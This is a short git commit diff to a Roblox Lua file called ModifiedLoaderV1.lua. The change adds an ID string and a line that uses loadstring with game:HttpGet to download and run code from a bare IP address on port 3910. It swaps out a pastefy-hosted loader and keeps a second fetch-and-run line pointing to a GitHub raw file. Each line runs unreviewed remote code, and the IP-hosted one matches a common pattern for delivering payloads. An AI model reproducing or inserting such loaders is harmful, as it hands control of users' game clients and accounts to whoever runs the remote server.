3feeabf7c21ab427e1e05cd8988c48bf6506aaf6
pastabein <culamboaaroncarl@gmail.com>
2025-09-20 17:53:46 +0800

    Update ModifiedLoaderV1.lua

--- ModifiedLoaderV1.lua
+++ ModifiedLoaderV1.lua
@@ -1,2 +1,3 @@
+ID="725c1a0c-66b7-48c7-8b39-198104a9d65b";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/pastabein/testscript/refs/heads/main/egg"))()
-loadstring(game:HttpGet("https://pastefy.app/bfCT77sr/raw"))()
